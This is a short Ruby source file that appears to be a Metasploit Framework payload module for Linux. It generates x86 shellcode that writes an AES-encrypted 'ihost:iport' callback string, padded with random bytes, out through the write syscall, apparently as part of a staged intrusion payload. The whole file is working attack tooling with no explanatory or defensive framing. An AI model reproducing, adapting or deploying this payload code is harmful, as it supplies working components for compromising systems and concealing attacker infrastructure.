# -*- coding: binary -*-

module Msf
  
    module Payload::Linux::SendMagic
        include Rex::Crypto

      def asm_send_magic(opts={})
        
        iconn = opts[:ihost]
        iconn += ':'
        iconn += opts[:iport]
        n = rand(7...50)
        r = Random.new.bytes(n - n % 4)
    
        magic = r
        magic += Aes256.encrypt_aes256(opts[:iv], opts[:key], iconn)
    
        asm = %Q^
            xor  eax,eax
            mov  al, 0x04
        ^

        magic.reverse.bytes.each_slice(4) do |word|
        asm << %Q^
            push 0x#{word.pack('C*').unpack('H*')[0]}
        ^
        end

        asm << %Q^
            mov  dl, 0x#{'%02x' % magic.length}
            xor  ebx, ebx
            mov  ecx, esp
            int  0x80
        ^
    
        asm
      end
    
    end
    
    end
    
    